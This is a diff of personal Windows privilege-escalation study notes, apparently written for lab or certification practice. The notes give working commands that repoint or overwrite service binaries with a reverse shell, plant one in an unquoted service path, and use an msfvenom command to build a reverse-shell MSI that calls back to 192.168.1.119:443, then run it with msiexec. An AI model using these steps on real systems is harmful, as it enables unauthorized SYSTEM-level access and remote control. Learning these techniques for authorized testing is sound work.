@@ -17,8 +17,9 @@ a- Insecure Service PErmissions:
 	- Can be verified from: .\accesschk.exe /accepteula -uwcqv user <service_name>
 	- Query service configuration with: sc qc <service_name>
 	- To query current state of servie: sc query <service_name>
-	- To modify path of the service: sc config <service_name> binpath= "C:\PrivEsc\reverse.exe\"
+	- To modify path of the service: sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""
 	- To start a service: net start <service_name>
+	
 b- Unquoted Service Path:
 	- Winpeas will highlight it.
 	- First check our permissions on that particular service to see if we can restart the serivce with: .\accesschk.exe /accepteula -ucqv user <service_name>
@@ -27,6 +28,8 @@ b- Unquoted Service Path:
 		- .\accesschk.exe /accepteula -uwdq "C:\Program Files"	
 		- .\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
 	- Once we have a path where we can write in the unquoted service path, we can copy our reverse shell and rename it as per the unquoted service path.
+	  copy reverse.exe "C:\Program Files\Unquoted Path Service\common.exe"
+
 c- Weak registry permissions:
 	- If we can modify the registry entries of a service, we can get a reverse shell by modifying "ImagePath" of any service.
 	- Winpeas will highlight it.
@@ -38,10 +41,10 @@ c- Weak registry permissions:
 d- Insecure Service Executeables:
 	- If the original service executeable is modifiable by our user, we can simple replace it with our reverse shell and restart the service.
 	- Winpeas will highlight as "File Permissions: Everyone"
-	- We can verify result with accesschk: .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\fileperservice.exe"
+	- We can verify result with accesschk: .\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
 	- Check if we can stop or start the service: .\accesschk.exe /accepteula -uvqc <service_name>
 	- Copy our reverse shell and overwrite service executeable: copy /Y <path to reverse.exe> <path of service.exe>
-	- Restart the service: net start service.exe
+	- Restart the service: net start <svc>
 e- DLL Hijacking:
 	- If we can right in PATH folders of Windows environment, then there is a fair chance of DLL hijacking. It will be highlighted by WinPeas.
 	- Process is very manual an we have to manually check non windows binaries to check on which services we have stop and start access to.
@@ -55,7 +58,7 @@ Registry Exploits:
 	1- AlwaysInstallElevated:
 		- If AlwaysInstallElevated is 1 in both HKLM and HKCU then this vulnerability can be exploited.
 		- To exploit it, generate a msi rev shell: msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.119 LPORT=443 -f msi -o shell.msi
-		- Copy the reverse.msi over to Windows machine and then just execute it: msiexec /quiet /qn /i shell.msi
+		- Copy the reverse.msi over to Windows machine and then just execute it: msiexec /quiet /qn /i reverse.msi
 
 Passwords:
 	- Just read output of winpeas attentively.
@@ -69,6 +72,7 @@ Scheduled Tasks:
 	- cmd command to get scheduled tasks: schtasks /query /fo LIST /v
 	- PS command version: Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft Taskname,TaskPath,State
 	- Once we have scheduled task like, use accesschk to confirm write privs.
+	- We often rely on scripts used in scheduled tasks for priv esc.
 
 Installed Apps:
 	- Use seatbelt.exe to show non standard installation which we can look of public exploits.
